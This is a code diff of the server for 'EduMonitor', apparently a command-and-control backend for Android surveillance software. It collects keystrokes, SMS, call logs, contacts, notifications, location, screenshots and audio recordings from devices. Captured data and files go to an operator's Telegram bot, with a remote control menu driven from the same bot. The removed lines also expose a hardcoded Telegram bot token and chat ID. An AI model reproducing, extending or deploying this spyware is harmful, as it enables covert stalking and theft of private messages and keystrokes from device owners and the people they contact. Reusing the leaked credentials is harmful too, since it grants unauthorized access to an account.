@@ -26,8 +26,8 @@ app.set('trust proxy', 1);
 // ============================================
 const config = {
     telegram: {
-        token: process.env.TELEGRAM_BOT_TOKEN || '8655508141:AAH7ziEjGbwnAKur944BomeVvQ6nrt7jzqw',
-        chatId: process.env.TELEGRAM_CHAT_ID || '5326373447'
+        token: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
+        chatId: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID'
     },
     server: {
         port: process.env.PORT || 8999,
@@ -38,7 +38,7 @@ const config = {
         rateLimit: 100
     },
     storage: {
-        maxFileSize: 100 * 1024 * 1024, // 100MB
+        maxFileSize: 100 * 1024 * 1024,
         retentionDays: 7
     }
 };
@@ -49,7 +49,6 @@ const config = {
 const db = new sqlite3.Database('./edumonitor.db');
 
 db.serialize(() => {
-    // Devices table
     db.run(`CREATE TABLE IF NOT EXISTS devices (
         id TEXT PRIMARY KEY,
         name TEXT,
@@ -65,7 +64,6 @@ db.serialize(() => {
         features TEXT
     )`);
 
-    // Commands table
     db.run(`CREATE TABLE IF NOT EXISTS commands (
         id TEXT PRIMARY KEY,
         device_id TEXT,
@@ -78,7 +76,6 @@ db.serialize(() => {
         priority INTEGER DEFAULT 0
     )`);
 
-    // Locations table
     db.run(`CREATE TABLE IF NOT EXISTS locations (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -91,7 +88,6 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
-    // Media table
     db.run(`CREATE TABLE IF NOT EXISTS media (
         id TEXT PRIMARY KEY,
         device_id TEXT,
@@ -104,7 +100,6 @@ db.serialize(() => {
         uploaded INTEGER DEFAULT 0
     )`);
 
-    // Keystrokes table
     db.run(`CREATE TABLE IF NOT EXISTS keystrokes (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -113,7 +108,6 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
-    // Notifications table
     db.run(`CREATE TABLE IF NOT EXISTS notifications (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -123,7 +117,6 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
-    // Contacts table
     db.run(`CREATE TABLE IF NOT EXISTS contacts (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -133,7 +126,6 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
-    // SMS table
     db.run(`CREATE TABLE IF NOT EXISTS sms_messages (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -144,7 +136,6 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
-    // Call logs table
     db.run(`CREATE TABLE IF NOT EXISTS call_logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -156,7 +147,6 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
-    // Installed apps table
     db.run(`CREATE TABLE IF NOT EXISTS installed_apps (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -175,7 +165,6 @@ app.use(compression());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 
-// Rate limiting
 const limiter = rateLimit({
     windowMs: 15 * 60 * 1000,
     max: config.security.rateLimit,
@@ -184,12 +173,13 @@ const limiter = rateLimit({
 app.use('/api/', limiter);
 
 // ============================================
-// WEBSOCKET SERVER (Primary Communication)
+// WEBSOCKET SERVER
 // ============================================
 const wss = new WebSocket.Server({ 
     server, 
     path: '/ws',
-    clientTracking: true
+    clientTracking: true,
+    perMessageDeflate: false
 });
 
 // ============================================
@@ -230,68 +220,43 @@ const TELEGRAM_API = `https://api.telegram.org/bot${config.telegram.token}`;
 async function setWebhook() {
     try {
         const webhookUrl = `https://edu2-801s.onrender.com/webhook`;
-        const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
+        await axios.post(`${TELEGRAM_API}/setWebhook`, {
             url: webhookUrl,
             allowed_updates: ["message", "callback_query"]
         });
-        console.log('✅ Webhook set:', response.data);
+        console.log('✅ Webhook set');
     } catch (error) {
-        console.error('❌ Failed to set webhook:', error.response?.data || error.message);
+        console.error('❌ Failed to set webhook:', error.message);
     }
 }
 
 async function sendTelegramMessage(chatId, text, options = {}) {
     try {
-        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: chatId,
             text: text,
             parse_mode: 'HTML',
             ...options
         });
-        return response.data;
     } catch (error) {
-        console.error('Telegram send error:', error.response?.data || error.message);
-        return null;
-    }
-}
-
-async function sendTelegramLocation(chatId, lat, lon) {
-    try {
-        await axios.post(`${TELEGRAM_API}/sendLocation`, {
-            chat_id: chatId,
-            latitude: lat,
-            longitude: lon
-        });
-    } catch (error) {
-        console.error('Location send error:', error);
+        console.error('Telegram send error:', error.message);
     }
 }
 
 async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
     try {
-        if (!fs.existsSync(filePath)) {
-            console.error('File not found:', filePath);
-            return;
-        }
-
-        const fileBuffer = fs.readFileSync(filePath);
+        if (!fs.existsSync(filePath)) return;
+        
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        
-        const blob = new Blob([fileBuffer], { type: 'application/octet-stream' });
-        formData.append('document', blob, filename);
-        
-        if (caption) {
-            formData.append('caption', caption);
-        }
+        formData.append('document', fs.createReadStream(filePath), filename);
+        if (caption) formData.append('caption', caption);
 
-        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
+        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
             headers: { 'Content-Type': 'multipart/form-data' }
         });
-        
-        console.log('✅ Document sent to Telegram:', response.data);
     } catch (error) {
-        console.error('❌ Document send error:', error.response?.data || error.message);
+        console.error('Document send error:', error.message);
     }
 }
 
@@ -303,36 +268,29 @@ async function editMessageText(chatId, messageId, text, keyboard = null) {
             text: text,
             parse_mode: 'HTML'
         };
-        if (keyboard) {
-            payload.reply_markup = { inline_keyboard: keyboard };
-        }
+        if (keyboard) payload.reply_markup = { inline_keyboard: keyboard };
         await axios.post(`${TELEGRAM_API}/editMessageText`, payload);
-        return true;
     } catch (error) {
-        if (error.response?.data?.description?.includes('message is not modified')) {
-            return true; // Message already has this content
+        if (!error.response?.data?.description?.includes('message is not modified')) {
+            await sendTelegramMessage(chatId, text, {
+                reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
+            });
         }
-        console.error('Edit message error:', error.response?.data?.description || error.message);
-        await sendTelegramMessage(chatId, text, {
-            reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
-        });
-        return false;
     }
 }
 
-async function answerCallbackQuery(callbackQueryId, text = null) {
+async function answerCallbackQuery(callbackQueryId) {
     try {
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-            callback_query_id: callbackQueryId,
-            text: text
+            callback_query_id: callbackQueryId
         });
     } catch (error) {
-        console.error('Answer callback error:', error);
+        console.error('Answer callback error:', error.message);
     }
 }
 
 // ============================================
-// PROFESSIONAL INLINE KEYBOARDS
+// INLINE KEYBOARDS
 // ============================================
 const MainMenuKeyboard = [
     [{ text: '📱 DEVICES', callback_data: 'menu_devices' }],
@@ -346,9 +304,8 @@ const DevicesMenuKeyboard = (devices) => {
     const keyboard = [];
     devices.forEach(device => {
         const batteryEmoji = getBatteryEmoji(device.battery_level);
-        const shortId = device.id.substring(0, 6);
         keyboard.push([{ 
-            text: `${batteryEmoji} ${device.model || 'Unknown'} (${shortId})`, 
+            text: `${batteryEmoji} ${device.model || 'Unknown'}`, 
             callback_data: `device_${device.id}` 
         }]);
     });
@@ -370,25 +327,6 @@ const DeviceActionKeyboard = (deviceId) => [
     [{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]
 ];
 
-const DataExtractionKeyboard = (deviceId) => [
-    [{ text: '📇 CONTACTS (TXT)', callback_data: `contacts_txt_${deviceId}` }, { text: '📇 CONTACTS (HTML)', callback_data: `contacts_html_${deviceId}` }],
-    [{ text: '💬 SMS (TXT)', callback_data: `sms_txt_${deviceId}` }, { text: '💬 SMS (HTML)', callback_data: `sms_html_${deviceId}` }],
-    [{ text: '📞 CALL LOGS (TXT)', callback_data: `calllogs_txt_${deviceId}` }, { text: '📞 CALL LOGS (HTML)', callback_data: `calllogs_html_${deviceId}` }],
-    [{ text: '📱 APPS (TXT)', callback_data: `apps_txt_${deviceId}` }, { text: '📱 APPS (HTML)', callback_data: `apps_html_${deviceId}` }],
-    [{ text: '⌨️ KEYSTROKES (TXT)', callback_data: `keystrokes_txt_${deviceId}` }, { text: '⌨️ KEYSTROKES (HTML)', callback_data: `keystrokes_html_${deviceId}` }],
-    [{ text: '🔔 NOTIFICATIONS (TXT)', callback_data: `notifications_txt_${deviceId}` }, { text: '🔔 NOTIFICATIONS (HTML)', callback_data: `notifications_html_${deviceId}` }],
-    [{ text: '🔔 NOTIFICATIONS (JSON)', callback_data: `notifications_json_${deviceId}` }, { text: '🔔 NOTIFICATIONS (CSV)', callback_data: `notifications_csv_${deviceId}` }],
-    [{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]
-];
-
-const SettingsMenuKeyboard = [
-    [{ text: '🔔 NOTIFICATIONS', callback_data: 'settings_notifications' }],
-    [{ text: '🎚️ AUTO SCREENSHOT', callback_data: 'settings_auto_screenshot' }],
-    [{ text: '⏰ RECORDING SCHEDULE', callback_data: 'settings_recording_schedule' }],
-    [{ text: '🔒 PRIVACY', callback_data: 'settings_privacy' }],
-    [{ text: '🔙 BACK TO MAIN', callback_data: 'menu_main' }]
-];
-
 // ============================================
 // DEVICE MANAGER
 // ============================================
@@ -397,12 +335,12 @@ class DeviceManager {
         this.devices = new Map();
         this.wsConnections = new Map();
         this.commandCallbacks = new Map();
+        this.pingIntervals = new Map();
         console.log('📱 DeviceManager initialized');
     }
 
     registerDevice(deviceId, ws, deviceInfo) {
-        console.log(`\n🔌 ===== DEVICE CONNECTION =====`);
-        console.log(`Device ID: ${deviceId}`);
+        console.log(`\n🔌 Device ${deviceId} connected`);
         
         const deviceKey = encryption.generateDeviceKey();
         
@@ -420,8 +358,14 @@ class DeviceManager {
         this.devices.set(deviceId, device);
         this.wsConnections.set(ws, deviceId);
         
-        console.log(`✅ Device registered successfully`);
-        console.log(`Total connected devices: ${this.devices.size}`);
+        // Set up ping interval for this device
+        const pingInterval = setInterval(() => {
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
+            }
+        }, 30000);
+        this.pingIntervals.set(ws, pingInterval);
+        
         return device;
     }
 
@@ -434,28 +378,16 @@ class DeviceManager {
     }
 
     sendCommand(deviceId, command, parameters = {}, callback = null) {
-        console.log(`\n📤 Sending command: ${command} to ${deviceId}`);
-        
         const device = this.devices.get(deviceId);
-        if (!device) {
-            return { success: false, error: 'Device not found' };
-        }
+        if (!device) return { success: false, error: 'Device not found' };
 
         const commandId = uuidv4();
-        const cmd = {
-            id: commandId,
-            command,
-            parameters,
-            timestamp: Date.now()
-        };
+        const cmd = { id: commandId, command, parameters, timestamp: Date.now() };
 
         if (callback) {
             this.commandCallbacks.set(commandId, callback);
-            
-            // Set timeout for callback
             setTimeout(() => {
                 if (this.commandCallbacks.has(commandId)) {
-                    console.log(`⏰ Command ${commandId} timed out`);
                     this.commandCallbacks.delete(commandId);
                     callback(false, null, 'Command timeout');
                 }
@@ -463,57 +395,43 @@ class DeviceManager {
         }
 
         try {
-            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
-                const message = JSON.stringify({
-                    type: 'command',
-                    id: commandId,
-                    data: cmd
-                });
-                
-                device.ws.send(message);
-                
+            if (device.ws?.readyState === WebSocket.OPEN) {
+                device.ws.send(JSON.stringify({ type: 'command', id: commandId, data: cmd }));
                 db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at)
                     VALUES (?, ?, ?, ?, 'sent', ?)`,
                     [commandId, deviceId, command, JSON.stringify(parameters), Date.now()]
                 );
-                
                 return { success: true, commandId };
-            } else {
-                device.pendingCommands.push(cmd);
-                return { success: true, commandId, queued: true };
             }
+            device.pendingCommands.push(cmd);
+            return { success: true, commandId, queued: true };
         } catch (error) {
-            console.error(`❌ Error sending command:`, error);
             return { success: false, error: error.message };
         }
     }
 
-    broadcastToDevices(message) {
-        this.devices.forEach((device) => {
-            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
-                device.ws.send(JSON.stringify(message));
-            }
-        });
-    }
-
     disconnectDevice(deviceId) {
-        console.log(`\n🔌 Device disconnected: ${deviceId}`);
-        
         const device = this.devices.get(deviceId);
         if (device) {
-            if (device.ws) {
-                this.wsConnections.delete(device.ws);
-            }
+            const pingInterval = this.pingIntervals.get(device.ws);
+            if (pingInterval) clearInterval(pingInterval);
+            this.pingIntervals.delete(device.ws);
+            this.wsConnections.delete(device.ws);
             this.devices.delete(deviceId);
             db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
+            console.log(`🔌 Device ${deviceId} disconnected`);
         }
+    }
+
+    getConnectedDevices() {
+        return Array.from(this.devices.values());
     }
 }
 
 const deviceManager = new DeviceManager();
 
 // ============================================
-// WEBSOCKET CONNECTION HANDLING
+// WEBSOCKET MESSAGE HANDLER
 // ============================================
 wss.on('connection', (ws, req) => {
     const deviceId = req.headers['device-id'];
@@ -521,9 +439,7 @@ wss.on('connection', (ws, req) => {
     
     try {
         deviceInfo = JSON.parse(req.headers['device-info'] || '{}');
-    } catch (e) {
-        console.error('Error parsing device info:', e);
-    }
+    } catch (e) {}
 
     if (!deviceId) {
         ws.close(1008, 'Device ID required');
@@ -535,11 +451,7 @@ wss.on('connection', (ws, req) => {
         chatId: config.telegram.chatId
     });
 
-    ws.send(JSON.stringify({
-        type: 'registered',
-        deviceId: device.id,
-        timestamp: Date.now()
-    }));
+    ws.send(JSON.stringify({ type: 'registered', deviceId: device.id, timestamp: Date.now() }));
 
     sendTelegramMessage(config.telegram.chatId, 
         `✅ *Device Connected*\nModel: ${device.info.model || 'Unknown'}`,
@@ -549,22 +461,11 @@ wss.on('connection', (ws, req) => {
     ws.on('message', async (data) => {
         try {
             const message = JSON.parse(data);
-            
-            if (!message.type) {
-                console.log('📩 Received message without type:', message);
-                return;
-            }
-            
-            console.log(`📩 Message type: ${message.type} from ${deviceId}`);
+            if (!message.type) return;
             
             switch (message.type) {
                 case 'register':
-                    console.log(`📱 Device ${deviceId} registered via WebSocket`);
-                    ws.send(JSON.stringify({
-                        type: 'registered',
-                        deviceId: deviceId,
-                        timestamp: Date.now()
-                    }));
+                    ws.send(JSON.stringify({ type: 'registered', deviceId, timestamp: Date.now() }));
                     break;
 
                 case 'pong':
@@ -615,9 +516,6 @@ wss.on('connection', (ws, req) => {
                 case 'recording_result':
                     await handleRecordingResult(deviceId, message);
                     break;
-                    
-                default:
-                    console.log('Unknown message type:', message.type);
             }
         } catch (error) {
             console.error('Error processing message:', error);
@@ -631,10 +529,8 @@ wss.on('connection', (ws, req) => {
     });
 
     ws.on('error', (error) => {
-        console.error(`WebSocket error for device ${deviceId}:`, error);
+        console.error(`WebSocket error for device ${deviceId}:`, error.message);
     });
-
-    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
 });
 
 // ============================================
@@ -642,8 +538,6 @@ wss.on('connection', (ws, req) => {
 // ============================================
 async function handleDeviceResponse(deviceId, message) {
     const { commandId, success, data, error } = message;
-    
-    console.log(`\n📥 Response for command ${commandId}: success=${success}`);
     
     db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
         [success ? 'completed' : 'failed', JSON.stringify(data || error), Date.now(), commandId]
@@ -658,7 +552,6 @@ async function handleDeviceResponse(deviceId, message) {
 
 async function handleScreenshotResult(deviceId, message) {
     const { commandId, filePath, fileSize } = message;
-    console.log(`📸 Screenshot received: ${filePath} (${fileSize} bytes)`);
     
     const callback = deviceManager.commandCallbacks.get(commandId);
     if (callback) {
@@ -672,7 +565,6 @@ async function handleScreenshotResult(deviceId, message) {
 
 async function handleRecordingResult(deviceId, message) {
     const { commandId, filePath, duration, fileSize } = message;
-    console.log(`🎤 Recording received: ${filePath} (${duration}s, ${fileSize} bytes)`);
     
     const callback = deviceManager.commandCallbacks.get(commandId);
     if (callback) {
@@ -688,48 +580,33 @@ async function handleDeviceLocation(deviceId, locationData) {
     const device = deviceManager.devices.get(deviceId);
     if (!device) return;
 
-    db.run(`INSERT INTO locations 
-        (device_id, latitude, longitude, accuracy, provider, timestamp)
+    db.run(`INSERT INTO locations (device_id, latitude, longitude, accuracy, provider, timestamp)
         VALUES (?, ?, ?, ?, ?, ?)`,
-        [
-            deviceId,
-            locationData.lat,
-            locationData.lon,
-            locationData.accuracy,
-            locationData.provider,
-            locationData.timestamp || Date.now()
-        ]
+        [deviceId, locationData.lat, locationData.lon, locationData.accuracy, 
+         locationData.provider, locationData.timestamp || Date.now()]
     );
 
     const mapsUrl = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
-    const message = 
+    await sendTelegramMessage(config.telegram.chatId, 
         `📍 *Location from ${device.info.model || 'Device'}*\n\n` +
-        `Lat: \`${locationData.lat}\`\n` +
-        `Lon: \`${locationData.lon}\`\n` +
-        `Accuracy: ±${locationData.accuracy}m\n` +
-        `Provider: ${locationData.provider}\n\n` +
-        `[View on Google Maps](${mapsUrl})`;
-
-    await sendTelegramMessage(config.telegram.chatId, message, { parse_mode: 'Markdown' });
+        `Lat: \`${locationData.lat}\`\nLon: \`${locationData.lon}\`\n` +
+        `Accuracy: ±${locationData.accuracy}m\nProvider: ${locationData.provider}\n\n` +
+        `[View on Google Maps](${mapsUrl})`, { parse_mode: 'Markdown' });
 }
 
 async function handleKeystroke(deviceId, data) {
-    db.run(`INSERT INTO keystrokes (device_id, package, text, timestamp)
-        VALUES (?, ?, ?, ?)`,
-        [deviceId, data.package, data.text, data.timestamp || Date.now()]
-    );
+    db.run(`INSERT INTO keystrokes (device_id, package, text, timestamp) VALUES (?, ?, ?, ?)`,
+        [deviceId, data.package, data.text, data.timestamp || Date.now()]);
 }
 
 async function handleNotification(deviceId, data) {
-    db.run(`INSERT INTO notifications (device_id, package, title, text, timestamp)
-        VALUES (?, ?, ?, ?, ?)`,
-        [deviceId, data.package, data.title, data.text, data.timestamp || Date.now()]
-    );
+    db.run(`INSERT INTO notifications (device_id, package, title, text, timestamp) VALUES (?, ?, ?, ?, ?)`,
+        [deviceId, data.package, data.title, data.text, data.timestamp || Date.now()]);
 }
 
 async function handleContacts(deviceId, data) {
     const stmt = db.prepare(`INSERT INTO contacts (device_id, name, number, contact_id, timestamp) VALUES (?, ?, ?, ?, ?)`);
-    data.contacts.forEach(contact => {
+    data.contacts?.forEach(contact => {
         stmt.run([deviceId, contact.name, contact.number, contact.id, Date.now()]);
     });
     stmt.finalize();
@@ -737,7 +614,7 @@ async function handleContacts(deviceId, data) {
 
 async function handleSMS(deviceId, data) {
     const stmt = db.prepare(`INSERT INTO sms_messages (device_id, address, body, date, type, timestamp) VALUES (?, ?, ?, ?, ?, ?)`);
-    data.messages.forEach(msg => {
+    data.messages?.forEach(msg => {
         stmt.run([deviceId, msg.address, msg.body, msg.date, msg.type, Date.now()]);
     });
     stmt.finalize();
@@ -745,7 +622,7 @@ async function handleSMS(deviceId, data) {
 
 async function handleCallLogs(deviceId, data) {
     const stmt = db.prepare(`INSERT INTO call_logs (device_id, number, date, duration, type, name, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)`);
-    data.logs.forEach(log => {
+    data.logs?.forEach(log => {
         stmt.run([deviceId, log.number, log.date, log.duration, log.type, log.name, Date.now()]);
     });
     stmt.finalize();
@@ -753,17 +630,15 @@ async function handleCallLogs(deviceId, data) {
 
 async function handleInstalledApps(deviceId, data) {
     const stmt = db.prepare(`INSERT INTO installed_apps (device_id, package, name, isSystem, timestamp) VALUES (?, ?, ?, ?, ?)`);
-    data.apps.forEach(app => {
+    data.apps?.forEach(app => {
         stmt.run([deviceId, app.package, app.name, app.isSystem, Date.now()]);
     });
     stmt.finalize();
 }
 
 // ============================================
-// API ENDPOINTS (Only for registration and uploads)
+// API ENDPOINTS
 // ============================================
-
-// Health check
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'healthy', 
@@ -772,75 +647,43 @@ app.get('/health', (req, res) => {
     });
 });
 
-// Device registration
 app.post('/api/register', (req, res) => {
-    console.log('📥 Registration request received');
-    
     const { deviceId, chatId, deviceInfo } = req.body;
-
-    if (!deviceId) {
-        return res.status(400).json({ error: 'Missing deviceId' });
-    }
+    if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
 
     const deviceKey = encryption.generateDeviceKey();
     
     db.run(`INSERT OR REPLACE INTO devices 
         (id, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features) 
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-        [
-            deviceId,
-            deviceInfo?.model || 'Unknown',
-            deviceInfo?.android || 'Unknown',
-            deviceInfo?.manufacturer || 'Unknown',
-            chatId || config.telegram.chatId,
-            Date.now(),
-            Date.now(),
-            deviceInfo?.battery || 100,
-            deviceKey,
-            JSON.stringify(deviceInfo?.features || [])
-        ],
+        [deviceId, deviceInfo?.model || 'Unknown', deviceInfo?.android || 'Unknown',
+         deviceInfo?.manufacturer || 'Unknown', chatId || config.telegram.chatId,
+         Date.now(), Date.now(), deviceInfo?.battery || 100, deviceKey,
+         JSON.stringify(deviceInfo?.features || [])],
         function(err) {
-            if (err) {
-                console.error('❌ Database error:', err);
-                return res.status(500).json({ error: 'Database error' });
-            }
-            
-            console.log(`✅ Device registered: ${deviceId}`);
+            if (err) return res.status(500).json({ error: 'Database error' });
             
             sendTelegramMessage(config.telegram.chatId, 
                 `✅ *New Device Registered*\nID: \`${deviceId.substring(0, 8)}...\`\nModel: ${deviceInfo?.model || 'Unknown'}`,
                 { parse_mode: 'Markdown' }
             );
             
-            res.json({
-                success: true,
-                deviceId,
-                key: deviceKey,
-                serverTime: Date.now()
-            });
+            res.json({ success: true, deviceId, key: deviceKey, serverTime: Date.now() });
         }
     );
 });
 
-// File upload endpoint
-const upload = multer({ 
-    dest: 'uploads/',
-    limits: { fileSize: config.storage.maxFileSize }
-});
+const upload = multer({ dest: 'uploads/', limits: { fileSize: config.storage.maxFileSize } });
 
-app.post('/api/upload-file', upload.single('file'), async (req, res) => {
+app.post('/api/upload-file', upload.single('file'), (req, res) => {
     try {
         const { deviceId, fileType, caption, filename } = req.body;
         const file = req.file;
-
-        if (!deviceId || !file) {
-            return res.status(400).json({ error: 'Missing fields' });
-        }
+        if (!deviceId || !file) return res.status(400).json({ error: 'Missing fields' });
 
         const mediaId = uuidv4();
         const fileExt = path.extname(filename || file.originalname);
         const newPath = path.join('uploads', `${mediaId}${fileExt}`);
-
         fs.renameSync(file.path, newPath);
 
         db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp, metadata)
@@ -848,78 +691,56 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             [mediaId, deviceId, fileType || 'unknown', newPath, file.size, Date.now(), 
              JSON.stringify({ caption, filename })],
             function(err) {
-                if (err) {
-                    console.error('Media insert error:', err);
-                    return res.status(500).json({ error: 'Database error' });
-                }
+                if (err) return res.status(500).json({ error: 'Database error' });
                 
                 db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
                     if (!err && device) {
-                        sendTelegramDocument(
-                            config.telegram.chatId, 
-                            newPath, 
+                        sendTelegramDocument(config.telegram.chatId, newPath, 
                             filename || file.originalname,
-                            `${caption || '📎 File'} from ${device.model || 'Device'}`
-                        );
+                            `${caption || '📎 File'} from ${device.model || 'Device'}`);
                     }
                 });
                 
                 res.json({ success: true, mediaId });
             }
         );
-
     } catch (error) {
-        console.error('Upload error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-// Location endpoint
 app.post('/api/location/:deviceId', (req, res) => {
-    const { deviceId } = req.params;
-    const locationData = req.body;
-
-    handleDeviceLocation(deviceId, locationData);
+    handleDeviceLocation(req.params.deviceId, req.body);
     res.json({ success: true });
 });
 
-// Data endpoints for extraction
 app.get('/api/data/:deviceId/:type', (req, res) => {
     const { deviceId, type } = req.params;
     const { format } = req.query;
     
-    let tableName;
-    switch(type) {
-        case 'keystrokes': tableName = 'keystrokes'; break;
-        case 'notifications': tableName = 'notifications'; break;
-        case 'contacts': tableName = 'contacts'; break;
-        case 'sms': tableName = 'sms_messages'; break;
-        case 'calllogs': tableName = 'call_logs'; break;
-        case 'apps': tableName = 'installed_apps'; break;
-        default: return res.status(400).json({ error: 'Invalid type' });
-    }
+    const tables = {
+        keystrokes: 'keystrokes',
+        notifications: 'notifications',
+        contacts: 'contacts',
+        sms: 'sms_messages',
+        calllogs: 'call_logs',
+        apps: 'installed_apps'
+    };
+    
+    const tableName = tables[type];
+    if (!tableName) return res.status(400).json({ error: 'Invalid type' });
     
     db.all(`SELECT * FROM ${tableName} WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1000`, 
-        [deviceId], 
-        (err, rows) => {
-            if (err) {
-                console.error('Data query error:', err);
-                return res.status(500).json({ error: 'Database error' });
-            }
+        [deviceId], (err, rows) => {
+            if (err) return res.status(500).json({ error: 'Database error' });
             
-            if (format === 'json') {
-                res.json(rows);
-            } else if (format === 'csv') {
-                if (!rows || rows.length === 0) {
-                    return res.send('No data');
-                }
+            if (format === 'json') res.json(rows);
+            else if (format === 'csv') {
+                if (!rows?.length) return res.send('No data');
                 const headers = Object.keys(rows[0]).join(',');
                 const csv = rows.map(row => Object.values(row).join(',')).join('\n');
-                res.header('Content-Type', 'text/csv');
-                res.send(headers + '\n' + csv);
-            } else {
-                res.json(rows);
-            }
+                res.header('Content-Type', 'text/csv').send(headers + '\n' + csv);
+            } else res.json(rows);
         }
     );
 });
@@ -932,35 +753,21 @@ app.post('/webhook', async (req, res) => {
     const update = req.body;
 
     try {
-        if (update.message) {
-            await handleTelegramMessage(update.message);
-        } else if (update.callback_query) {
-            await handleTelegramCallback(update.callback_query);
-        }
+        if (update.message) await handleTelegramMessage(update.message);
+        else if (update.callback_query) await handleTelegramCallback(update.callback_query);
     } catch (error) {
-        console.error('Error processing webhook:', error);
+        console.error('Webhook error:', error.message);
     }
 });
 
 async function handleTelegramMessage(message) {
     const chatId = message.chat.id;
     const text = message.text;
-
-    if (chatId.toString() !== config.telegram.chatId) {
-        await sendTelegramMessage(chatId, '⛔ Unauthorized');
-        return;
-    }
-
-    if (!text) return;
+    if (chatId.toString() !== config.telegram.chatId || !text) return;
 
     if (text === '/start' || text === '/help' || text === '/menu') {
-        await sendTelegramMessage(chatId, 
-            '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
-            { 
-                parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: MainMenuKeyboard }
-            }
-        );
+        await sendTelegramMessage(chatId, '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
+            { parse_mode: 'Markdown', reply_markup: { inline_keyboard: MainMenuKeyboard } });
     } else if (text === '/devices') {
         await showDevicesMenu(chatId, message.message_id);
     }
@@ -970,170 +777,105 @@ async function handleTelegramCallback(callbackQuery) {
     const chatId = callbackQuery.message.chat.id;
     const messageId = callbackQuery.message.message_id;
     const data = callbackQuery.data;
-    const callbackId = callbackQuery.id;
+    await answerCallbackQuery(callbackQuery.id);
 
-    await answerCallbackQuery(callbackId);
+    const handlers = {
+        'menu_main': () => editMessageText(chatId, messageId,
+            '🤖 *EduMonitor Control Panel*\n\nSelect an option below:', MainMenuKeyboard),
+        'menu_devices': () => showDevicesMenu(chatId, messageId),
+        'menu_screenshot': () => showScreenshotMenu(chatId, messageId),
+        'menu_recording': () => showRecordingMenu(chatId, messageId),
+        'menu_location': () => showLocationMenu(chatId, messageId),
+        'menu_files': () => showFilesMenu(chatId, messageId),
+        'menu_data': () => showDataExtractionMenu(chatId, messageId),
+        'menu_help': () => showHelpMenu(chatId, messageId)
+    };
 
-    try {
-        if (data === 'menu_main') {
-            await editMessageText(chatId, messageId,
-                '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
-                MainMenuKeyboard
-            );
-        }
-        else if (data === 'menu_devices') {
-            await showDevicesMenu(chatId, messageId);
-        }
-        else if (data === 'menu_screenshot') {
-            await showScreenshotMenu(chatId, messageId);
-        }
-        else if (data === 'menu_recording') {
-            await showRecordingMenu(chatId, messageId);
-        }
-        else if (data === 'menu_location') {
-            await showLocationMenu(chatId, messageId);
-        }
-        else if (data === 'menu_files') {
-            await showFilesMenu(chatId, messageId);
-        }
-        else if (data === 'menu_data') {
-            await showDataExtractionMenu(chatId, messageId);
-        }
-        else if (data === 'menu_settings') {
-            await editMessageText(chatId, messageId,
-                '⚙️ *Settings Menu*\n\nConfigure your preferences:',
-                SettingsMenuKeyboard
-            );
-        }
-        else if (data === 'menu_help') {
-            await showHelpMenu(chatId, messageId);
-        }
-        else if (data.startsWith('device_')) {
-            const deviceId = data.substring(7);
-            await showDeviceDetails(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('screenshot_')) {
-            const deviceId = data.substring(11);
-            await takeScreenshot(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('record_')) {
-            const parts = data.split('_');
-            const seconds = parseInt(parts[1]);
-            const deviceId = parts.slice(2).join('_');
-            await startRecording(chatId, messageId, deviceId, seconds);
-        }
-        else if (data.startsWith('location_')) {
-            const deviceId = data.substring(9);
-            await getLocation(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('files_')) {
-            const deviceId = data.substring(6);
-            await listFiles(chatId, messageId, deviceId);
